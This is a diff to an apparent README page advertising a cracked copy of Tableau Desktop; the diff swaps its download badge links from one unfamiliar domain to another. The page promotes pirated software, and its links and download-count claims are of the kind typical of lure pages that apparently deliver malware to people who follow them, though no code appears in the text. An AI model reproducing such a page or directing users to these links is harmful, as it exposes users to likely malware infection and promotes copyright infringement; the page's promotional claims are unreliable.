@@ -1,6 +1,6 @@
 # Tableau Desktop Crack 2026 — Data Viz
 
-[![Download](https://img.shields.io/badge/Download-v2024.2-brightgreen?style=for-the-badge)](https://dllvcrun.com/tableau)
+[![Download](https://img.shields.io/badge/Download-v2024.2-brightgreen?style=for-the-badge)](https://p-csx-5.com/tableau)
 
 > **Tableau Desktop cracked — connect to any data source and build visual dashboards.**
 
@@ -48,7 +48,7 @@ A: Yes — Tableau AI auto-suggests charts and insights.
 
 **Monthly downloads:** 480k+
 
-[![Download](https://img.shields.io/badge/Download-v2024.2-brightgreen?style=for-the-badge)](https://dllvcrun.com/tableau)
+[![Download](https://img.shields.io/badge/Download-v2024.2-brightgreen?style=for-the-badge)](https://p-csx-5.com/tableau)
 
 ---
 
